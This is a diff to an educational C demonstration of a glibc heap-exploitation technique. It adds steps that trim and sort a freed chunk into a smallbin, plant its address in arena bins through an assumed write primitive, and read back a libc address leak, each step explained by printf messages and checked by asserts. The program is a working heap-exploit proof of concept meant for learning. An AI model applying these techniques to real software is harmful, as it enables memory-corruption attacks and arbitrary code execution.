@@ -31,6 +31,7 @@
 #include <assert.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <string.h>
 #include <gnu/libc-version.h>
 
 #define ALLOC_SIZE 0x220
@@ -120,6 +121,14 @@ int main(){
 	printf("\n\nInitializing victim_chunk with victim - 0x10 bytes to account for metadata\n");
 	char **victim_chunk = (char **)victim-2;
 
+
+	//allocating the chunk whose bin we use to get a leak
+	printf("\n\nAllocating a large chunk , we will use the same trimming trick\n");
+	printf("to put this chunk in a smallbin ahead of victim's, this chunk will\n");
+	printf("be used to obtain a leak when we control bins in the arena , we call it freed\n");
+	printf("the trimming result is slightly larger larger then victim so its bin lands\n");
+	printf("slightly ahead of victim's");
+	char *freed = malloc(0x410+ALLOC_SIZE+0x20);
 	//sort victim into the small bin
 	//this progression bypasses filling the tcache 
 	//so 6 less allocations
@@ -128,6 +137,24 @@ int main(){
 
 	//keep the address of the smallbin for later sanity check
 	char *smallbin = victim_chunk[3];
+
+	//free freed
+	printf("\n\nfreeing freed , it will be put in the unsorted bin\n");
+	free(freed);
+	//allocating a trimming chunk to make freed of size ALLOC_SIZE + 0x20
+	printf("\n\nAllocating a large chunk to trim freed into the approprite size\n");
+	char *trim_freed = malloc(0x400);
+	printf("\n\nUpdating the freed pointer , since it advanced by 0x410\n");
+	freed += 0x410;
+	//freed including metadata
+	printf("\n\nInitializing victim_chunk with victim - 0x10 bytes to account for metadata\n");
+	char **freed_chunk = (char **)freed-2;
+
+	printf("\n\nAllocating a large chunk to sort freed into a smallbin\n");
+	void *sort_freed = malloc(0x1000);
+
+	//keep the address of the leaked smallbin for later sanity check
+	char *smallbin_leak_check = freed_chunk[2];
 
 	printf("\n\nConstructing a fake list of chunks in the buffer we used for trimming\n");
 	printf("victim , every item in this list is a chunk of size 0x10 that has a bk\n ");
@@ -183,20 +210,29 @@ int main(){
 	printf("passed !\n");
 
 
-	printf("\n\nAssuming the attacker can read chunk , allocated[0] is a libc address\n");
-	printf("of the bin right before the one that we allocated\n");
-	printf("(this is because the bin is an incomplete malloc chunk strcuture)\n");
-	printf("that only has the fd/bk fields , and so by holding the address of the bin\n");
-	printf("right before it in its fd/bk ,it would be point to itself as a pseudo-chunk)\n");
-	printf("this is why the allocated address is of the one before the bin corresponding\n");
-	printf("to victime despite the code writing the 'bin' address\n");
+	printf("\n\nNow let's use freed to get a libc leak\n");
+	printf("First lets zero out the allocated chunk the the arena to make sure \n");
+	printf("we don't read unitialized data\n");
+	printf("memset(allocated,0,ALLOC_SIZE+0x10);");
+	memset(allocated,0,ALLOC_SIZE+0x10);
+	printf("\n\nUsing our write access we write the address of freed (which we can\n");
+	printf("calclulate with the heap leak), in its smallbin which is ahead of the bin\n");
+	printf("we allocated\n");
+	allocated[6] = allocated[7] = (char *)freed_chunk;
+	printf("\n\nthe freed chunk was previously freed and it holds the correct links\n");
+	printf("for its bin , now that we have written it back during out initialization\n");
+	printf("of the allocated chunk in the arena, if we allocate the exact size \n");
+	printf("corresponding to freed , we will allocated it , and the bin links will be\n");
+	printf("written back into its bin , which is within our read reach\n");
+	char *trigger_leak = malloc(ALLOC_SIZE+0x20);
 	//READING LEAK , ASSUMING READ CAPABILITY TO CHUNK
-	printf("\nchar *leak = allocated[0];\n");
-	char *leak = allocated[0];
+	printf("\nchar *leak = allocated[7];\n");
+	char *leak = allocated[7];
+	
 	//the leak has the address of the bin immediately before
 	printf("\nsanity check : \n");
-	printf("assert((long)leak == (long)smallbin-0x10);\n");
-	assert((long)leak == (long)smallbin-0x10);
+	printf("assert((long)leak == (long)smallbin_leak_check);\n");
+	assert((long)leak == (long)smallbin_leak_check);
 	printf("passed !\n");
 	
 
@@ -274,6 +310,7 @@ int main(){
 	printf("assert((long)expand > (long) stdout);\n");
 	assert((long)expand > (long) stdout);
 	printf("passed!\n");
+	printf("congratz!\n");
 
 
 }
